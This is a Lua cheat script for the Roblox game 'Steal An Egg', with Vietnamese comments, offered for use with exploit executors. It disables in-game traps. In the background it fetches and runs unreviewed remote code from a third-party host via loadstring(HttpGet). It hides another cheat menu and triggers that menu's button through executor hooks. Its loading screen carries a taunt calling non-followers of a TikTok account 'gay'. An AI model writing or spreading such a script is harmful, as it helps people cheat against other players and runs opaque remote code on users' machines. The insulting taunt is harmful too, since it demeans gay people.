-- ==============================================================================
--  RONNEI HUB - STEAL AN EGG (FIX CRASH FONT & FULLSCREEN LOADING V1)
--  Avatar: 124285855971647 | Đầy đủ nút bấm | Loading che màn hình khi BẬT
-- ==============================================================================

local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local CoreGuiService = game:GetService("CoreGui")
local SoundService = game:GetService("SoundService")
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- CẤU HÌNH LOGO, LINK & ÂM THANH
local CONFIG = {
    LogoAssetID = "rbxassetid://124285855971647",
    TikTokURL   = "https://www.tiktok.com/@ronnei7.htk?_r=1&_t=ZS-98ygZG9Gh2G",
    ToggleOnSFX  = "rbxassetid://9114223175",
    ToggleOffSFX = "rbxassetid://9114223204",
    ClickSFX     = "rbxassetid://9114223164",
    SuccessSFX   = "rbxassetid://9114223245"
}

-- ĐỊNH NGHĨA FONT TRỰC TIẾP (CHỐNG CRASH)
local FONT_BOLD = Enum.Font.GothamBold
local FONT_MED  = Enum.Font.GothamMedium

-- BẢNG MÀU GIAO DIỆN
local THEME = {
    MainBG     = Color3.fromRGB(13, 15, 22),
    CardBG     = Color3.fromRGB(22, 26, 36),
    CardHover  = Color3.fromRGB(30, 36, 50),
    AccentMint = Color3.fromRGB(0, 230, 120),
    Gold       = Color3.fromRGB(255, 200, 40),
    Border     = Color3.fromRGB(45, 55, 75),
    ToggleOff  = Color3.fromRGB(38, 43, 56),
    TextMain   = Color3.fromRGB(245, 248, 255),
    TextSub    = Color3.fromRGB(150, 165, 185)
}

local RainbowSequence = ColorSequence.new({
    ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)),
    ColorSequenceKeypoint.new(0.16, Color3.fromRGB(255, 127, 0)),
    ColorSequenceKeypoint.new(0.33, Color3.fromRGB(255, 255, 0)),
    ColorSequenceKeypoint.new(0.50, Color3.fromRGB(0, 255, 70)),
    ColorSequenceKeypoint.new(0.66, Color3.fromRGB(0, 180, 255)),
    ColorSequenceKeypoint.new(0.83, Color3.fromRGB(170, 0, 255)),
    ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 0))
})

-- ==================== 1. ENGINE PHÁT ÂM THANH ====================
local function playSFX(soundId, volume, pitch)
    task.spawn(function()
        pcall(function()
            local snd = Instance.new("Sound")
            snd.SoundId = soundId
            snd.Volume = volume or 1.0
            snd.PlaybackSpeed = pitch or 1.0
            SoundService:PlayLocalSound(snd)
            task.delay(1.5, function() snd:Destroy() end)
        end)
    end)
end

-- ==================== 2. MODULE ANTI-TRAP (CHẠY NGẦM) ====================
task.spawn(function()
    local trapKeywords = {"trap", "beartrap", "subspace", "mine", "landmine", "turret", "spike"}

    local function neutralizeTrap(inst)
        pcall(function()
            local name = inst.Name:lower()
            local isTrap = false

            for _, kw in ipairs(trapKeywords) do
                if name:find(kw, 1, true) then
                    isTrap = true
                    break
                end
            end

            if isTrap then
                if inst:IsA("BasePart") then
                    inst.CanTouch = false
                    inst.CanCollide = false
                    local touch = inst:FindFirstChildOfClass("TouchTransmitter")
                    if touch then touch:Destroy() end
                elseif inst:IsA("Model") then
                    for _, part in ipairs(inst:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.CanTouch = false
                            part.CanCollide = false
                            local touch = part:FindFirstChildOfClass("TouchTransmitter")
                            if touch then touch:Destroy() end
                        end
                    end
                end
            end
        end)
    end

    for _, obj in ipairs(Workspace:GetDescendants()) do neutralizeTrap(obj) end
    Workspace.DescendantAdded:Connect(neutralizeTrap)
end)

-- ==================== 3. KHỞI CHẠY SCRIPT GỐC NGẦM ====================
task.spawn(function()
    pcall(function()
        script_key = "Trial"
        loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/6582551b42d21c6b7eb55f1d76d8d50ce53cb35592093d6615b5e83437594dc0.lua"))()
    end)
end)

-- Dọn sạch bản cũ
local parentTarget = (gethui and gethui()) or (LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui")) or CoreGuiService
local oldGui = parentTarget:FindFirstChild("Ronnei_StealAnEgg_Master")
if oldGui then oldGui:Destroy() end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Ronnei_StealAnEgg_Master"
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.DisplayOrder = 999999
ScreenGui.Parent = parentTarget

-- ==================== 4. DIỆT TẬN GỐC MENU EQUINOZ & HORIZON ====================
local originalEquinozBtn = nil
local targetEquinozGui = nil

local function neutralizeEquinoz(inst)
    pcall(function()
        if inst:IsDescendantOf(ScreenGui) or inst == ScreenGui then return end

        if inst:IsA("TextLabel") or inst:IsA("TextButton") then
            local txt = inst.Text:upper()
            if txt:find("EQUINOZ") or txt:find("STEAL AN EGG V1") or txt:find("4HPFT") or txt:find("ANTI HIT") then
                if txt:find("ANTI HIT") then
                    originalEquinozBtn = inst:IsA("TextButton") and inst or inst:FindFirstAncestorOfClass("TextButton")
                end

                local sg = inst:FindFirstAncestorOfClass("ScreenGui")
                if sg and sg ~= ScreenGui then
                    targetEquinozGui = sg
                    sg.Enabled = false
                    for _, child in ipairs(sg:GetDescendants()) do
                        if child:IsA("GuiObject") then
                            child.Visible = false
                            child.Position = UDim2.new(10, 0, 10, 0)
                        end
                    end
                end
            end
        end
    end)
end

for _, c in ipairs({CoreGuiService, gethui and gethui(), LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui")}) do
    if c then
        for _, desc in ipairs(c:GetDescendants()) do neutralizeEquinoz(desc) end
        c.DescendantAdded:Connect(neutralizeEquinoz)
    end
end

RunService.RenderStepped:Connect(function()
    if targetEquinozGui and targetEquinozGui.Parent then
        targetEquinozGui.Enabled = false
    end
end)

-- HÀM KÉO THẢ GIAO DIỆN
local function makeDraggable(targetFrame, dragBar)
    local dragging, dragStart, startPos = false, nil, nil
    dragBar = dragBar or targetFrame

    dragBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = targetFrame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    dragBar.InputChanged:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and dragging then
            local delta = input.Position - dragStart
            targetFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

-- ==================== 5. MÀN HÌNH LOADING CHE TOÀN MÀN HÌNH ====================
local isCurrentlyLoading = false

local function showLoadingScreen(onComplete)
    isCurrentlyLoading = true

    local LoadOverlay = Instance.new("Frame", ScreenGui)
    LoadOverlay.Name = "RonneiFullScreenLoader"
    LoadOverlay.Size = UDim2.new(1, 0, 1, 0)
    LoadOverlay.Position = UDim2.new(0, 0, 0, 0)
    LoadOverlay.BackgroundColor3 = Color3.fromRGB(6, 8, 12)
    LoadOverlay.BackgroundTransparency = 0.1
    LoadOverlay.ZIndex = 1000000

    local CenterBox = Instance.new("Frame", LoadOverlay)
    CenterBox.Size = UDim2.new(0, 340, 0, 160)
    CenterBox.Position = UDim2.new(0.5, 0, 0.5, 0)
    CenterBox.AnchorPoint = Vector2.new(0.5, 0.5)
    CenterBox.BackgroundTransparency = 1
    CenterBox.ZIndex = 1000001

    local Spinner = Instance.new("Frame", CenterBox)
    Spinner.Size = UDim2.new(0, 48, 0, 48)
    Spinner.Position = UDim2.new(0.5, 0, 0, 10)
    Spinner.AnchorPoint = Vector2.new(0.5, 0)
    Spinner.BackgroundTransparency = 1
    Spinner.ZIndex = 1000002
    Instance.new("UICorner", Spinner).CornerRadius = UDim.new(1, 0)

    local SpinnerStroke = Instance.new("UIStroke", Spinner)
    SpinnerStroke.Thickness = 3.5
    SpinnerStroke.Color = Color3.fromRGB(255, 255, 255)
    
    local SpinnerGrad = Instance.new("UIGradient", SpinnerStroke)
    SpinnerGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, THEME.AccentMint),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 200, 255)),
        ColorSequenceKeypoint.new(1, THEME.AccentMint)
    })
    SpinnerGrad.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0),
        NumberSequenceKeypoint.new(0.7, 0.5),
        NumberSequenceKeypoint.new(1, 1)
    })

    local LoadTitle = Instance.new("TextLabel", CenterBox)
    LoadTitle.Size = UDim2.new(1, 0, 0, 26)
    LoadTitle.Position = UDim2.new(0, 0, 0, 75)
    LoadTitle.BackgroundTransparency = 1
    LoadTitle.Text = "ANTI GUARDS WAKE UP V1"
    LoadTitle.Font = FONT_BOLD
    LoadTitle.TextSize = 16
    LoadTitle.TextColor3 = THEME.TextMain
    LoadTitle.ZIndex = 1000002

    local LoadSub = Instance.new("TextLabel", CenterBox)
    LoadSub.Size = UDim2.new(1, 0, 0, 20)
    LoadSub.Position = UDim2.new(0, 0, 0, 105)
    LoadSub.BackgroundTransparency = 1
    LoadSub.Text = "chưa follow tiktok ronnei7.htk là gay"
    LoadSub.Font = FONT_MED
    LoadSub.TextSize = 12
    LoadSub.TextColor3 = Color3.fromRGB(255, 100, 120)
    LoadSub.ZIndex = 1000002

    playSFX(CONFIG.ToggleOnSFX, 1.0, 1.0)

    local spinConn
    spinConn = RunService.RenderStepped:Connect(function()
        if Spinner and Spinner.Parent then
            SpinnerGrad.Rotation = (SpinnerGrad.Rotation + 8) % 360
        else
            if spinConn then spinConn:Disconnect() end
        end
    end)

    task.delay(1.4, function()
        if spinConn then spinConn:Disconnect() end

        local twOverlay = TweenService:Create(LoadOverlay, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
            BackgroundTransparency = 1
        })
        TweenService:Create(LoadTitle, TweenInfo.new(0.25), {TextTransparency = 1}):Play()
        TweenService:Create(LoadSub, TweenInfo.new(0.25), {TextTransparency = 1}):Play()
        TweenService:Create(SpinnerStroke, TweenInfo.new(0.25), {Transparency = 1}):Play()
        
        twOverlay:Play()
        twOverlay.Completed:Connect(function()
            LoadOverlay:Destroy()
            isCurrentlyLoading = false
            if onComplete then onComplete() end
        end)
    end)
end

-- ==================== 6. GIAO DIỆN CHÍNH (VIỀN CẦU VỒNG RGB) ====================
local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Name = "RonneiMainCard"
MainFrame.Size = UDim2.new(0, 275, 0, 175)
MainFrame.Position = UDim2.new(1, -295, 0, 55)
MainFrame.BackgroundColor3 = THEME.MainBG
MainFrame.BorderSizePixel = 0
Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)

local MainStroke = Instance.new("UIStroke", MainFrame)
MainStroke.Thickness = 2.5
MainStroke.Color = Color3.fromRGB(255, 255, 255)
MainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local MainRainbowGrad = Instance.new("UIGradient", MainStroke)
MainRainbowGrad.Color = RainbowSequence

-- Header
local Header = Instance.new("Frame", MainFrame)
Header.Size = UDim2.new(1, 0, 0, 42)
Header.BackgroundTransparency = 1

local Title = Instance.new("TextLabel", Header)
Title.Size = UDim2.new(1, -50, 0, 20)
Title.Position = UDim2.new(0, 14, 0, 6)
Title.BackgroundTransparency = 1
Title.Text = "RONNEI HUB"
Title.Font = FONT_BOLD
Title.TextSize = 14
Title.TextColor3 = THEME.TextMain
Title.TextXAlignment = Enum.TextXAlignment.Left

local Subtitle = Instance.new("TextLabel", Header)
Subtitle.Size = UDim2.new(1, -50, 0, 14)
Subtitle.Position = UDim2.new(0, 14, 0, 24)
Subtitle.BackgroundTransparency = 1
Subtitle.Text = "STEAL AN EGG • SPECIAL V1"
Subtitle.Font = FONT_MED
Subtitle.TextSize = 10
Subtitle.TextColor3 = THEME.AccentMint
Subtitle.TextXAlignment = Enum.TextXAlignment.Left

local CloseBtn = Instance.new("TextButton", Header)
CloseBtn.Size = UDim2.new(0, 26, 0, 26)
CloseBtn.Position = UDim2.new(1, -34, 0.5, 0)
CloseBtn.AnchorPoint = Vector2.new(0, 0.5)
CloseBtn.BackgroundColor3 = THEME.CardBG
CloseBtn.Text = "X"
CloseBtn.Font = FONT_BOLD
CloseBtn.TextSize = 12
CloseBtn.TextColor3 = THEME.TextSub
Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)

makeDraggable(MainFrame, Header)

local Divider = Instance.new("Frame", MainFrame)
Divider.Size = UDim2.new(1, -24, 0, 1)
Divider.Position = UDim2.new(0, 12, 0, 44)
Divider.BackgroundColor3 = THEME.Border
Divider.BorderSizePixel = 0

local Content = Instance.new("Frame", MainFrame)
Content.Size = UDim2.new(1, -24, 0, 115)
Content.Position = UDim2.new(0, 12, 0, 52)
Content.BackgroundTransparency = 1

-- NÚT 1: ANTI GUARDS WAKE UP (👑 PREMIUM TOGGLE)
local GuardCard = Instance.new("Frame", Content)
GuardCard.Size = UDim2.new(1, 0, 0, 48)
GuardCard.BackgroundColor3 = THEME.CardBG
GuardCard.BorderSizePixel = 0
Instance.new("UICorner", GuardCard).CornerRadius = UDim.new(0, 8)

local GuardStroke = Instance.new("UIStroke", GuardCard)
GuardStroke.Color = THEME.Border
GuardStroke.Thickness = 1

local GuardTitle = Instance.new("TextLabel", GuardCard)
GuardTitle.Size = UDim2.new(1, -65, 0, 20)
GuardTitle.Position = UDim2.new(0, 10, 0, 6)
GuardTitle.BackgroundTransparency = 1
GuardTitle.Text = "Anti Guards Wake Up"
GuardTitle.Font = FONT_BOLD
GuardTitle.TextSize = 11
GuardTitle.TextColor3 = THEME.TextMain
GuardTitle.TextXAlignment = Enum.TextXAlignment.Left

local PremTag = Instance.new("TextLabel", GuardCard)
PremTag.Size = UDim2.new(1, -65, 0, 14)
PremTag.Position = UDim2.new(0, 10, 0, 25)
PremTag.BackgroundTransparency = 1
PremTag.Text = "[PREMIUM MODE]"
PremTag.Font = FONT_BOLD
PremTag.TextSize = 9
PremTag.TextColor3 = THEME.Gold
PremTag.TextXAlignment = Enum.TextXAlignment.Left

local Switch = Instance.new("TextButton", GuardCard)
Switch.Size = UDim2.new(0, 42, 0, 22)
Switch.Position = UDim2.new(1, -10, 0.5, 0)
Switch.AnchorPoint = Vector2.new(1, 0.5)
Switch.BackgroundColor3 = THEME.ToggleOff
Switch.Text = ""
Switch.AutoButtonColor = false
Instance.new("UICorner", Switch).CornerRadius = UDim.new(1, 0)

local Knob = Instance.new("Frame", Switch)
Knob.Size = UDim2.new(0, 16, 0, 16)
Knob.Position = UDim2.new(0, 3, 0.5, 0)
Knob.AnchorPoint = Vector2.new(0, 0.5)
Knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Knob.BorderSizePixel = 0
Instance.new("UICorner", Knob).CornerRadius = UDim.new(1, 0)

local isAntiGuardEnabled = false

local function setSwitchVisual(state)
    isAntiGuardEnabled = state

    if isAntiGuardEnabled then
        TweenService:Create(Switch, TweenInfo.new(0.2), {BackgroundColor3 = THEME.AccentMint}):Play()
        TweenService:Create(Knob, TweenInfo.new(0.2), {Position = UDim2.new(1, -19, 0.5, 0)}):Play()
        TweenService:Create(GuardStroke, TweenInfo.new(0.2), {Color = THEME.AccentMint}):Play()
    else
        playSFX(CONFIG.ToggleOffSFX, 1.0, 1.0)
        TweenService:Create(Switch, TweenInfo.new(0.2), {BackgroundColor3 = THEME.ToggleOff}):Play()
        TweenService:Create(Knob, TweenInfo.new(0.2), {Position = UDim2.new(0, 3, 0.5, 0)}):Play()
        TweenService:Create(GuardStroke, TweenInfo.new(0.2), {Color = THEME.Border}):Play()
    end
end

local function fireOriginalEquinoz()
    if originalEquinozBtn then
        pcall(function()
            if firesignal then
                firesignal(originalEquinozBtn.MouseButton1Click)
                firesignal(originalEquinozBtn.Activated)
            elseif getconnections then
                for _, conn in ipairs(getconnections(originalEquinozBtn.MouseButton1Click)) do conn:Fire() end
                for _, conn in ipairs(getconnections(originalEquinozBtn.Activated)) do conn:Fire() end
            end
        end)
    end
end

local function handleToggleAntiGuard()
    if isCurrentlyLoading then return end

    if not isAntiGuardEnabled then
        showLoadingScreen(function()
            setSwitchVisual(true)
            fireOriginalEquinoz()
        end)
    else
        setSwitchVisual(false)
        fireOriginalEquinoz()
    end
end

Switch.MouseButton1Click:Connect(handleToggleAntiGuard)
GuardCard.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        handleToggleAntiGuard()
    end
end)

task.spawn(function()
    while true do
        if originalEquinozBtn and not isCurrentlyLoading then
            pcall(function()
                local t = originalEquinozBtn.Text:upper()
                if t:find("ON") and not isAntiGuardEnabled then
                    setSwitchVisual(true)
                elseif t:find("OFF") and isAntiGuardEnabled then
                    setSwitchVisual(false)
                end
            end)
        end
        task.wait(0.3)
    end
end)

-- NÚT 2: SAO CHÉP LINK TIKTOK
local TikTokBtn = Instance.new("TextButton", Content)
TikTokBtn.Size = UDim2.new(1, 0, 0, 44)
TikTokBtn.Position = UDim2.new(0, 0, 0, 56)
TikTokBtn.BackgroundColor3 = THEME.CardBG
TikTokBtn.Text = ""
TikTokBtn.AutoButtonColor = false
Instance.new("UICorner", TikTokBtn).CornerRadius = UDim.new(0, 8)

local TTStroke = Instance.new("UIStroke", TikTokBtn)
TTStroke.Color = THEME.Border
TTStroke.Thickness = 1

local TTIcon = Instance.new("ImageLabel", TikTokBtn)
TTIcon.Size = UDim2.new(0, 26, 0, 26)
TTIcon.Position = UDim2.new(0, 10, 0.5, 0)
TTIcon.AnchorPoint = Vector2.new(0, 0.5)
TTIcon.BackgroundTransparency = 1
TTIcon.Image = CONFIG.LogoAssetID
TTIcon.ImageColor3 = Color3.fromRGB(255, 255, 255)
TTIcon.ScaleType = Enum.ScaleType.Crop
Instance.new("UICorner", TTIcon).CornerRadius = UDim.new(0, 6)

local TTLabel = Instance.new("TextLabel", TikTokBtn)
TTLabel.Size = UDim2.new(1, -48, 1, 0)
TTLabel.Position = UDim2.new(0, 44, 0, 0)
TTLabel.BackgroundTransparency = 1
TTLabel.Text = "TikTok: @ronnei7.htk"
TTLabel.Font = FONT_BOLD
TTLabel.TextSize = 11
TTLabel.TextColor3 = THEME.TextMain
TTLabel.TextXAlignment = Enum.TextXAlignment.Left

TikTokBtn.MouseButton1Click:Connect(function()
    playSFX(CONFIG.SuccessSFX, 1.0, 1.0)

    if setclipboard then pcall(function() setclipboard(CONFIG.TikTokURL) end)
    elseif toclipboard then pcall(function() toclipboard(CONFIG.TikTokURL) end) end

    TTLabel.Text = "[V] Da sao chep link TikTok!"
    TTLabel.TextColor3 = THEME.AccentMint
    TweenService:Create(TikTokBtn, TweenInfo.new(0.15), {BackgroundColor3 = THEME.CardHover}):Play()
    TweenService:Create(TTStroke, TweenInfo.new(0.15), {Color = THEME.AccentMint}):Play()

    task.delay(2, function()
        if TikTokBtn.Parent then
            TTLabel.Text = "TikTok: @ronnei7.htk"
            TTLabel.TextColor3 = THEME.TextMain
            TweenService:Create(TikTokBtn, TweenInfo.new(0.2), {BackgroundColor3 = THEME.CardBG}):Play()
            TweenService:Create(TTStroke, TweenInfo.new(0.2), {Color = THEME.Border}):Play()
        end
    end)
end)

-- ==================== 7. NÚT TRÒN MỞ MENU (FLOATING LOGO) ====================
local ToggleBtn = Instance.new("Frame", ScreenGui)
ToggleBtn.Name = "RonneiFloatingLogo"
ToggleBtn.Size = UDim2.new(0, 52, 0, 52)
ToggleBtn.Position = UDim2.new(0, 20, 0.35, 0)
ToggleBtn.BackgroundColor3 = THEME.CardBG
ToggleBtn.ClipsDescendants = true
Instance.new("UICorner", ToggleBtn).CornerRadius = UDim.new(1, 0)

local LogoStroke = Instance.new("UIStroke", ToggleBtn)
LogoStroke.Thickness = 2.5
LogoStroke.Color = Color3.fromRGB(255, 255, 255)
LogoStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local LogoRainbowGrad = Instance.new("UIGradient", LogoStroke)
LogoRainbowGrad.Color = RainbowSequence

task.spawn(function()
    local rot = 0
    while ScreenGui.Parent do
        rot = (rot + 2.5) % 360
        LogoRainbowGrad.Rotation = rot
        MainRainbowGrad.Rotation = rot
        task.wait(0.02)
    end
end)

local LogoImage = Instance.new("ImageLabel", ToggleBtn)
LogoImage.Size = UDim2.new(1, 0, 1, 0)
LogoImage.Position = UDim2.new(0.5, 0, 0.5, 0)
LogoImage.AnchorPoint = Vector2.new(0.5, 0.5)
LogoImage.BackgroundTransparency = 1
LogoImage.Image = CONFIG.LogoAssetID
LogoImage.ImageColor3 = Color3.fromRGB(255, 255, 255)
LogoImage.ScaleType = Enum.ScaleType.Crop
Instance.new("UICorner", LogoImage).CornerRadius = UDim.new(1, 0)

makeDraggable(ToggleBtn)

local isMenuOpen = true
local function setMenuVisible(state)
    isMenuOpen = state
    playSFX(CONFIG.ClickSFX, 1.0, isMenuOpen and 1.1 or 0.9)

    if isMenuOpen then
        MainFrame.Visible = true
        TweenService:Create(MainFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
            Size = UDim2.new(0, 275, 0, 175)
        }):Play()
    else
        local tw = TweenService:Create(MainFrame, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {
            Size = UDim2.new(0, 275, 0, 0)
        })
        tw:Play()
        tw.Completed:Connect(function()
            if not isMenuOpen then MainFrame.Visible = false end
        end)
    end
end

ToggleBtn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        setMenuVisible(not isMenuOpen)
    end
end)

CloseBtn.MouseButton1Click:Connect(function()
    setMenuVisible(false)
end)
